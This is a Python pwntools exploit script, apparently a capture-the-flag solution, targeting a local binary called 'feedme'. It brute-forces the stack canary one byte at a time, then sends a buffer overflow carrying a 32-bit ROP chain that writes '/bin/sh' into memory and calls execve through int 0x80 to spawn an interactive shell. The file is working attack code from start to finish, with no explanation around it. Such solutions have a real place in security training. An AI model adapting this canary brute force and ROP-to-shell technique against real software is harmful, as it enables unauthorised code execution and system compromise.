#!/usr/bin/env python3

import pwn

io = pwn.process("./feedme")

def b(i):
    return i.to_bytes(4, "little")

def canary_bruteforce():
    size = 0x22
    # little endian for send
    known_canary = "\x00"
    # big endian for display
    hex_canary = "00"
    for i in range(0, 3):
        for ch in range(0xFF):
            io.send(chr(size))
            
            payload = "0" * 0x20 + known_canary + chr(ch)
            io.send(payload)

            resp = io.recvuntil(b"exit.")
            if b"YUM" in resp:
                known_canary += chr(ch)
                size += 1

                hex_canary = hex(ch).replace("0x", "") + hex_canary
                print("New bytes {} - Current canary: 0x{}".format(i, hex_canary))
                break

    return hex_canary

offset = 0x30
            
pwn.log.info("Bruteforcing canary...")
hex_canary = canary_bruteforce()
pwn.log.success("Canary in hex: 0x{}".format(hex_canary))

canary = int(hex_canary, 16).to_bytes(4, "little")

pathLocation = 0x80eaff0
popEax = 0x080bb496
popEcxEbx = 0x0806f371
popEdx = 0x0806f34a
movEdxToEaxPoints = 0x0807be31
int80 = 0x08049761

rop = b""

# write "/bin"
rop += b(popEax)
rop += b(pathLocation)
rop += b(popEdx)
rop += b(0x6e69622f)
rop += b(movEdxToEaxPoints)

# write "/sh\x00"
rop += b(popEax)
rop += b(pathLocation + 4)
rop += b(popEdx)
rop += b(0x0068732f)
rop += b(movEdxToEaxPoints)

# syscall
rop += b(popEax)
rop += b(0x0b)
rop += b(popEcxEbx)
rop += b(0x0)
rop += b(pathLocation)
rop += b(popEdx)
rop += b(0x0)
rop += b(int80)

payload = b"A" * 0x20 + canary + b"A" * 12 + rop

io.send(chr(len(payload)))
io.send(payload)

io.interactive()
